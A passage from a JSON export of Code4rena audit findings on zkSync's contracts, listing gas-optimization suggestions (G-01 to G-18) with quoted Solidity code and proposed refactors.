      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33263",
      "title": "[G-18] Redundant casting of addresses in `isSystemContract()`",
      "impact": "GAS",
      "content": "\n**File:** `SystemContractHelper.sol`\n\n[File: code/system-contracts/contracts/libraries/SystemContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L338)\n```solidity\n338:     function isSystemContract(address _address) internal pure returns (bool) {\n339:         return uint160(_address) <= uint160(MAX_SYSTEM_CONTRACT_ADDRESS);\n340:     }\n```\n\nSolidity allows to compare two addresses without casting them to integer first. This means, that above code can be changed to:\n\n```\nreturn _address <= MAX_SYSTEM_CONTRACT_ADDRESS;\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33262",
      "title": "[G-17] Utilize post-incrementing to optimize `pushBack()` function",
      "impact": "GAS",
      "content": "\n**File:** `PriorityQueue.sol`\n\nThis issue is reported as separate finding, because proposed optimizations require code refactoring.\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/PriorityQueue.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/PriorityQueue.sol#L55)\n```solidity\n55:     function pushBack(Queue storage _queue, PriorityOperation memory _operation) internal {\n56:         // Save value into the stack to avoid double reading from the storage\n57:         uint256 tail = _queue.tail;\n58: \n59:         _queue.data[tail] = _operation;\n60:         _queue.tail = tail + 1;\n61:     }\n```\n\nWe can get rid of variable `tail` by using `_queue.tail++` directly in `_queue.data`:\n\n```\nfunction pushBack(Queue storage _queue, PriorityOperation memory _operation) internal {\n    _queue.data[_queue.tail++] = _operation;\n}\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33261",
      "title": "[G-16] Redundant casting in `getSize()`",
      "impact": "GAS",
      "content": "\n**File:** `PriorityQueue.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/PriorityQueue.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/PriorityQueue.sol#L45)\n```solidity\n45:     function getSize(Queue storage _queue) internal view returns (uint256) {\n46:         return uint256(_queue.tail - _queue.head);\n47:     }\n```\n\nSince both `_queue.tail` and `_queue.head` are `uint256`, there's no need to cast `_queue.tail - _queue.head` to `uint256`. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33260",
      "title": "[G-15] Create one, specific event, instead of emitting two events in a row",
      "impact": "GAS",
      "content": "\n**Files:** `StateTransitionManager.sol`, `Bridgehub.sol`, `Admin.sol`\n\nInstead of spending gas on emitting two events at once, it's better to create one, single event and emit it once.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L40)\n```solidity\n40:         emit NewPendingAdmin(pendingAdmin, address(0));\n41:         emit NewAdmin(previousAdmin, pendingAdmin);\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L127)\n```solidity\n127:         emit NewPendingAdmin(currentPendingAdmin, address(0));\n128:         emit NewAdmin(previousAdmin, pendingAdmin);\n```\n\n[File: code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridgehub/Bridgehub.sol#L68)\n```solidity\n68:         emit NewPendingAdmin(currentPendingAdmin, address(0));\n69:         emit NewAdmin(previousAdmin, pendingAdmin);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33259",
      "title": "[G-14] Pre-compute and cache `domainSeparator` in `TransactionHelper.sol`",
      "impact": "GAS",
      "content": "\n**File:** `TransactionHelper.sol`\n\n[File: code/system-contracts/contracts/libraries/TransactionHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/libraries/TransactionHelper.sol#L138)\n```solidity\n138:         bytes32 domainSeparator = keccak256(\n139:             abi.encode(EIP712_DOMAIN_TYPEHASH, keccak256(\"zkSync\"), keccak256(\"2\"), block.chainid)\n140:         );\n```\n\nIt's a common pattern to pre-compute and cache domain separator and then, compare it with pre-computed, cached value, instead of calculating it every time.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33258",
      "title": "[G-13] Divide loop in `_commitBatchesWithSystemContractsUpgrade()` to avoid redundant `if`",
      "impact": "GAS",
      "content": "\n**File:** `Executor.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L289)\n```solidity\n289:         for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n290:             // The upgrade transaction must only be included in the first batch.\n291:             bytes32 expectedUpgradeTxHash = i == 0 ? _systemContractUpgradeTxHash : bytes32(0);\n292:             _lastCommittedBatchData = _commitOneBatch(\n293:                 _lastCommittedBatchData,\n294:                 _newBatchesData[i],\n295:                 expectedUpgradeTxHash\n296:             );\n```\n\nIn function `_commitBatchesWithSystemContractsUpgrade()` - on every loop iteration - we check if `i == 0` (line 291). This condition is obviously `true` only during the first loop iteration. It's recommended to divide the loop into two parts:  \n```\nfor (uint256 i = 0; i < 1; i = i.uncheckedInc())\n```\n\n```\nfor (uint256 i = 1; i < _newBatchesData.length; i = i.uncheckedInc())\n```\n\nMoreover, this would allow us to declare `expectedUpgradeTxHash` outside the loop - thus we won't spend additional gas on declaring this variable during every loop iteration.\n\nThat way, in the second loop we will be able to remove `i == 0` condition.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33257",
      "title": "[G-12] Proof verification in `Executor.sol` is performed twice",
      "impact": "GAS",
      "content": "\n**File:** `Executor.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L429)\n```solidity\n429:         if (_proof.serializedProof.length > 0) {\n430:             _verifyProof(proofPublicInput, _proof);\n431:         }\n432:         // #else\n433:         _verifyProof(proofPublicInput, _proof);\n434:         // #endif\n```\n\nWhen `_proof.serializedProof.length > 0` function will call `_verifyProof(proofPublicInput, _proof)` twice - at line 430 and at line 433.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33256",
      "title": "[G-11] Do not calculate the length of array multiple of times",
      "impact": "GAS",
      "content": "\n**Files:** `L2ContractHelper.sol`, `Compressor.sol`, `BaseZkSyncUpgrade.sol`, `PubdataChunkPublisher.sol`, `Executor.sol`, `DiamondProxy.sol`\n\nWhile calculating the length of an array costs a lot of gas - it's recommended to calculate it once and then, cache the result inside the local variable.\nPlease notice that this is NOT the same issue as bot-report mentions. The bot-report contains instances of calculating array's length in the loop iterator, e.g.: `for (uint i=0; i < array.length; i++)`, while this issue reports that the length of the array is calculated within the loop (line 42).\n\n[File: code/system-contracts/contracts/PubdataChunkPublisher.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/PubdataChunkPublisher.sol#L36)\n```solidity\n36:         for (uint256 i = 0; i < MAX_NUMBER_OF_BLOBS; i++) {\n37:             uint256 start = BLOB_SIZE_BYTES * i;\n38: \n39:             // We break if the pubdata isn't enough to cover 2 blobs. On L1 it is expected that the hash\n40:             // will be bytes32(0) if a blob isn't going to be used.\n41:             if (start >= _pubdata.length) {\n42:                 break;\n43:             }\n```\n\nIn function `chunkAndPublishPubdata()`, the length of array is calculated on every loop iteration.\n\n[File: code/system-contracts/contracts/Compressor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/Compressor.sol#L52)\n```solidity\n52:                 encodedData.length * 4 == _bytecode.length,\n53:                 \"Encoded data length should be 4 times shorter than the original bytecode\"\n54:             );\n55: \n56:             require(\n57:                 dictionary.length / 8 <= encodedData.length / 2,\n58:                 \"Dictionary should have at most the same number of entries as the encoded data\"\n59:             );\n60: \n61:             for (uint256 encodedDataPointer = 0; encodedDataPointer < encodedData.length; encodedDataPointer += 2) {\n62:                 uint256 indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;\n63:                 require(indexOfEncodedChunk < dictionary.length, \"Encoded chunk index is out of bounds\");\n```\n\n`encodedData.length` is calculated 3 times (lines 52, 57, 61). Calculate it once and cache its value to local variable.\n`dictionary.length` is calculated 2 times (line 57, 63). Calculate it once and cache its value to local variable.\n\n[File: code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L23)\n```solidity\n23:         require(_bytecode.length % 32 == 0, \"pq\");\n24: \n25:         uint256 bytecodeLenInWords = _bytecode.length / 32;\n```\n`_bytecode.length` is calculated twice, it would be more efficient to calculate it once and cache the result before line 23.\n\n[File: code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L223)\n```solidity\n223:         require(_factoryDeps.length == _expectedHashes.length, \"Wrong number of factory deps\");\n224:         require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"Factory deps can be at most 32\");\n225: \n226:         for (uint256 i = 0; i < _factoryDeps.length; ++i) {\n```\n`_factoryDeps.length` is calculated 3 times (lines 223, 224, 226). Calculate it once and cache the result into local variable before line 223.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondProxy.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondProxy.sol#L25)\n```solidity\n25:         require(msg.data.length >= 4 || msg.data.length == 0, \"Ut\");\n```\n\n`msg.data.length` is calculated twice. Calculate it once and cache the result into local variable.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L631)\n```solidity\n631:         require(_pubdataCommitments.length > 0, \"pl\");\n632:         require(_pubdataCommitments.length <= PUBDATA_COMMITMENT_SIZE * MAX_NUMBER_OF_BLOBS, \"bd\");\n633:         require(_pubdataCommitments.length % PUBDATA_COMMITMENT_SIZE == 0, \"bs\");\n634:         blobCommitments = new bytes32[](MAX_NUMBER_OF_BLOBS);\n635: \n636:         for (uint256 i = 0; i < _pubdataCommitments.length; i += PUBDATA_COMMITMENT_SIZE) {\n```\n\n`_pubdataCommitments.length` is calculated 4 times (lines 631, 632, 633m 636). Calculate it once and cache the result into local variable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33255",
      "title": "[G-10] Refactor functions with events which emit both new and old values",
      "impact": "GAS",
      "content": "\n**Files:** `StateTransitionManager.sol`, `Admin.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L23)\n```solidity\n23:     function setPendingAdmin(address _newPendingAdmin) external onlyAdmin {\n24:         // Save previous value into the stack to put it into the event later\n25:         address oldPendingAdmin = s.pendingAdmin;\n26:         // Change pending admin\n27:         s.pendingAdmin = _newPendingAdmin;\n28:         emit NewPendingAdmin(oldPendingAdmin, _newPendingAdmin);\n29:     }\n```\n\nTo avoid creating additional variable `oldPendingAdmin` which stores `s.pendingAdmin` before the update - we can move emitting event one line above:\n\n```\n   function setPendingAdmin(address _newPendingAdmin) external onlyAdmin {\n        emit NewPendingAdmin(s.pendingAdmin, _newPendingAdmin);\n        s.pendingAdmin = _newPendingAdmin;  \n    }\n```\n\nThe same issue was observed in other instances:\n\n[File: code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L110)\n```solidity\n110:     function setPendingAdmin(address _newPendingAdmin) external onlyOwnerOrAdmin {\n111:         // Save previous value into the stack to put it into the event later\n112:         address oldPendingAdmin = pendingAdmin;\n113:         // Change pending admin\n114:         pendingAdmin = _newPendingAdmin;\n115:         emit NewPendingAdmin(oldPendingAdmin, _newPendingAdmin);\n116:     }\n```\n\nShould be changed as above.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L58)\n```solidity\n58:     function setPriorityTxMaxGasLimit(uint256 _newPriorityTxMaxGasLimit) external onlyStateTransitionManager { \n59:         require(_newPriorityTxMaxGasLimit <= MAX_GAS_PER_TRANSACTION, \"n5\");\n60: \n61:         uint256 oldPriorityTxMaxGasLimit = s.priorityTxMaxGasLimit;\n62:         s.priorityTxMaxGasLimit = _newPriorityTxMaxGasLimit;\n63:         emit NewPriorityTxMaxGasLimit(oldPriorityTxMaxGasLimit, _newPriorityTxMaxGasLimit);\n64:     }\n```\n\ncan be changed to:\n\n```\n    function setPriorityTxMaxGasLimit(uint256 _newPriorityTxMaxGasLimit) external onlyStateTransitionManager { \n        require(_newPriorityTxMaxGasLimit <= MAX_GAS_PER_TRANSACTION, \"n5\");\n        emit NewPriorityTxMaxGasLimit(s.priorityTxMaxGasLimit, _newPriorityTxMaxGasLimit);\n        s.priorityTxMaxGasLimit = _newPriorityTxMaxGasLimit;\n        \n    }\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33254",
      "title": "[G-09]  Avoid reading state variable twice",
      "impact": "GAS",
      "content": "\n**Files:** `SystemContext.sol`, `L2StandardERC20.sol`\n\nReading state variables costs a lot of gas. It's better to always cache the state variable into local variable and read the local variable instead.\n\n[File: code/contracts/zksync/contracts/bridge/L2StandardERC20.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2StandardERC20.sol#L093)\n```solidity\n093:         try this.decodeUint8(decimalsBytes) returns (uint8 decimalsUint8) {\n094:             // Set decoded value for decimals.\n095:             decimals_ = decimalsUint8;\n096:         } catch {\n097:             getters.ignoreDecimals = true;\n098:         }\n099: \n100:         availableGetters = getters;\n101:         emit BridgeInitialize(_l1Address, decodedName, decodedSymbol, decimals_);\n```\nVariable `decimals_` is a state variable, thus reading it costs more gas than local variable.\nPlease notice, that we're reading this variable twice - firstly, at line 95, then at line 101.\n\nReading state variables multiple of times costs a lot of gas. Much more effective solution would be to just read it once and cache the result into local variable.\n\n[File: code/system-contracts/contracts/SystemContext.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L117)\n```solidity\n117:     function getCurrentPubdataSpent() public view returns (uint256) {\n118:         uint256 pubdataPublished = SystemContractHelper.getZkSyncMeta().pubdataPublished;\n119:         return pubdataPublished > basePubdataSpent ? pubdataPublished - basePubdataSpent : 0;\n120:     }\n```\n\nTo avoid reading `basePubdataSpent` twice, above code can be rewritten to:\n\n```\n    function getCurrentPubdataSpent() public view returns (uint256) {\n        uint256 cachedBasePubdataSpent = basePubdataSpent;\n        uint256 pubdataPublished = SystemContractHelper.getZkSyncMeta().pubdataPublished;\n        return pubdataPublished > cachedBasePubdataSpent ? pubdataPublished - cachedBasePubdataSpent : 0;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33253",
      "title": "[G-08] Repack struct by putting data types that fit together into one slot next to each other",
      "impact": "GAS",
      "content": "\nThis issue, in comparison to `# [5] Alter some struct's fields datatype to improve packing`  is related to changing the order of fields in the struct (while `[5]` suggests changing the datatype of fields) - thus it's being reported separately.\n\n**File:** `IExecutor.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-interfaces/IExecutor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-interfaces/IExecutor.sol#L83)\n```solidity\n83:     struct StoredBatchInfo {\n84:         uint64 batchNumber;\n85:         bytes32 batchHash;\n86:         uint64 indexRepeatedStorageChanges; \n87:         uint256 numberOfLayer1Txs;\n88:         bytes32 priorityOperationsHash;\n89:         bytes32 l2LogsTreeRoot;\n90:         uint256 timestamp;\n91:         bytes32 commitment;\n92:     }\n```\n\n`batchNumber` and `indexRepeatedStorageChanges` will fit into one slot.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33252",
      "title": "[G-07] In `NonceHolder.sol`, ID mappings can be combined into a single `mapping` of an ID to a `struct`",
      "impact": "GAS",
      "content": "\n**File:** `NonceHolder.sol`\n\n[File: code/system-contracts/contracts/NonceHolder.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/NonceHolder.sol#L36)\n```solidity\n36:     mapping(uint256 account => uint256 packedMinAndDeploymentNonce) internal rawNonces;\n37: \n38:     /// Mapping of values under nonces for accounts.\n39:     /// The main key of the mapping is the 256-bit address of the account, while the\n40:     /// inner mapping is a mapping from a nonce to the value stored there.\n41:     mapping(uint256 account => mapping(uint256 nonceKey => uint256 value)) internal nonceValues;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33251",
      "title": "[G-06] State variables may be packed into fewer storage slots",
      "impact": "GAS",
      "content": "\n**File:** `Governance.sol`\n\n[File: code/contracts/ethereum/contracts/governance/Governance.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/governance/Governance.sol#L26)\n```solidity\n26:     address public securityCouncil;\n27: \n28:     /// @notice A mapping to store timestamps when each operation will be ready for execution.\n29:     /// @dev - 0 means the operation is not created.\n30:     /// @dev - 1 (EXECUTED_PROPOSAL_TIMESTAMP) means the operation is already executed.\n31:     /// @dev - any other value means timestamp in seconds when the operation will be ready for execution.\n32:     mapping(bytes32 operationId => uint256 executionTimestamp) public timestamps;\n33: \n34:     /// @notice The minimum delay in seconds for operations to be ready for execution.\n35:     uint256 public minDelay;\n```\nConsider changing `minDelay` type from `uint256` to `uint64`. Then, it could be packed in a single storage slot with `address public securityCouncil`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33250",
      "title": "[G-05] Alter some struct's fields datatype to improve packing",
      "impact": "GAS",
      "content": "\n**Files:** `Messaging.sol`, `BaseZkSyncUpgrade.sol`, `IExecutor.sol`\n\n[File: code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L28)\n```solidity\n28: struct ProposedUpgrade {\n29:     L2CanonicalTransaction l2ProtocolUpgradeTx;\n30:     bytes[] factoryDeps;\n31:     bytes32 bootloaderHash;\n32:     bytes32 defaultAccountHash;\n33:     address verifier;\n34:     VerifierParams verifierParams;\n35:     bytes l1ContractsUpgradeCalldata;\n36:     bytes postUpgradeCalldata;\n37:     uint256 upgradeTimestamp;\n38:     uint256 newProtocolVersion;\n39: }\n```\n`newProtocolVersion` is being increases every time upgrade is made. `upgradeTimestamp` contains the timestamp of the upgrade. Both these fields can be `uint128` (instead of `uint256`) to fit into one slot.\n\n[File: code/contracts/ethereum/contracts/common/Messaging.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/Messaging.sol#L098)\n```solidity\n098: struct L2CanonicalTransaction {\n099:     uint256 txType;\n100:     uint256 from;\n101:     uint256 to;\n102:     uint256 gasLimit;\n103:     uint256 gasPerPubdataByteLimit;\n104:     uint256 maxFeePerGas;\n105:     uint256 maxPriorityFeePerGas;\n106:     uint256 paymaster;\n107:     uint256 nonce;\n108:     uint256 value;\n```\n\nBoth `nonce` and `txType` fields can be `uint128 ` to fit into single slot.\nBoth `gasLimit` and `gasPerPubdataByteLimit` can be `uint128` to fit into single slot.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-interfaces/IExecutor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-interfaces/IExecutor.sol#L83)\n```solidity\n83:     struct StoredBatchInfo {\n84:         uint64 batchNumber;\n85:         bytes32 batchHash;\n86:         uint64 indexRepeatedStorageChanges; \n87:         uint256 numberOfLayer1Txs;\n88:         bytes32 priorityOperationsHash;\n89:         bytes32 l2LogsTreeRoot;\n90:         uint256 timestamp;\n91:         bytes32 commitment;\n92:     }\n```\n`timestamp` field can be `uint64`. Then, it can be moved after `batchNumber` to fit a single slot (`uint64` + `uint64`).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33249",
      "title": "[G-04] Refactor `Diamond.sol` by inlining `_saveFacetIfNew()` function",
      "impact": "GAS",
      "content": "\n**File:** `Diamond.sol`\n\nThis issue is reported as a separate finding, since it requires multiple of changes in the code base.\nOur recommendation is to inline `_saveFacetIfNew()` to avoid additional SSTORE performed by `DiamondStorage storage ds = getDiamondStorage()`.\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/Diamond.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/Diamond.sol#L189)\n```solidity\n189:     function _saveFacetIfNew(address _facet) private {\n190:         DiamondStorage storage ds = getDiamondStorage();\n191: \n192:         uint256 selectorsLength = ds.facetToSelectors[_facet].selectors.length;\n193:         // If there are no selectors associated with facet then save facet as new one\n194:         if (selectorsLength == 0) {\n195:             ds.facetToSelectors[_facet].facetPosition = ds.facets.length.toUint16();\n196:             ds.facets.push(_facet);\n197:         }\n198:     }\n```\nFunction `_saveFacetIfNew()` executes `DiamondStorage storage ds = getDiamondStorage();` (line 189).\nWe can spot, that function `_saveFacetIfNew()` is called inside `_addFunctions()` and `_replaceFunctions()`. Those functions - at the beginning of their implementation perform the same operation: `DiamondStorage storage ds = getDiamondStorage();`.\nThis basically means, that `DiamondStorage storage ds = getDiamondStorage();` is redundant in the `_saveFacetIfNew()`. We can inline `_saveFacetIfNew()` in `_addFunctions()` and `_replaceFunctions()` to avoid repeating `DiamondStorage storage ds = getDiamondStorage();`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33248",
      "title": "[G-03] Function `initialize()` in `L2SharedBridge.sol` can be optimized",
      "impact": "GAS",
      "content": "\n**File:** `L2SharedBridge.sol`\n\nThis issue requires code-refactoring of some code, thus it was reported separately.\n\n[File: code/contracts/zksync/contracts/bridge/L2SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2SharedBridge.sol#L60)\n```solidity\n60:         l1Bridge = _l1Bridge;\n61:         l2TokenProxyBytecodeHash = _l2TokenProxyBytecodeHash;\n62: \n63:         if (block.chainid != ERA_CHAIN_ID) {\n64:             address l2StandardToken = address(new L2StandardERC20{salt: bytes32(0)}());\n65:             l2TokenBeacon = new UpgradeableBeacon{salt: bytes32(0)}(l2StandardToken);\n66:             l2TokenBeacon.transferOwnership(_aliasedOwner);\n67:         } else {\n68:             require(_l1LegecyBridge != address(0), \"bf2\");\n69:             // l2StandardToken and l2TokenBeacon are already deployed on ERA, and stored in the proxy\n70:         }\n```\nWhen `block.chainid` is `ERA_CHAIN_ID` and `_l1LegecyBridge` is `address(0)` - we can revert earlier, without wasting gas on reading state variables: `l1Bridge` and `l2TokenProxyBytecodeHash`.\nMoreover, we can use `==` operator, instead of `!=`.\n\n```\n        if (block.chainid == ERA_CHAIN_ID) {\n        require(_l1LegecyBridge != address(0), \"bf2\");\n        } else {\n            address l2StandardToken = address(new L2StandardERC20{salt: bytes32(0)}());\n            l2TokenBeacon = new UpgradeableBeacon{salt: bytes32(0)}(l2StandardToken);\n            l2TokenBeacon.transferOwnership(_aliasedOwner);\n        }\n        l1Bridge = _l1Bridge;\n        l2TokenProxyBytecodeHash = _l2TokenProxyBytecodeHash;\n\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33247",
      "title": "[G-02] Function `setNewBatch()` from `SystemContext.sol` can be optimized",
      "impact": "GAS",
      "content": "\n**File:** `SystemContext.sol`\nThis issue requires code-refactoring of some code, thus it was reported separately.\n\n[File: code/system-contracts/contracts/SystemContext.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L452)\n```solidity\n452:         require(previousBatchNumber + 1 == _expectedNewNumber, \"The provided block number is not correct\");\n453: \n454:         _ensureBatchConsistentWithL2Block(_newTimestamp);\n455: \n456:         batchHashes[previousBatchNumber] = _prevBatchHash;\n457: \n458:         // Setting new block number and timestamp\n459:         BlockInfo memory newBlockInfo = BlockInfo({number: previousBatchNumber + 1, timestamp: _newTimestamp});\n```\nThere's unnecessary addition, which can be removed from above function. Let's take a look at lines 452 and 459: `previousBatchNumber + 1`.\nSince line 452 requires, that `previousBatchNumber + 1 == _expectedNewNumber` (otherwise, function will revert), we can be sure, that `_expectedNewNumber == previousBatchNumber + 1`. This implies, that at line 459, instead of using addition again, we can simply use `_expectedNewNumber` instead:\n\n```\n459:         BlockInfo memory newBlockInfo = BlockInfo({number: _expectedNewNumber, timestamp: _newTimestamp});\n```\n\nThis will save us from spending additional gas on unnecessary operation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33246",
      "title": "[G-01] Function `_revertBatches()` can be optimized",
      "impact": "GAS",
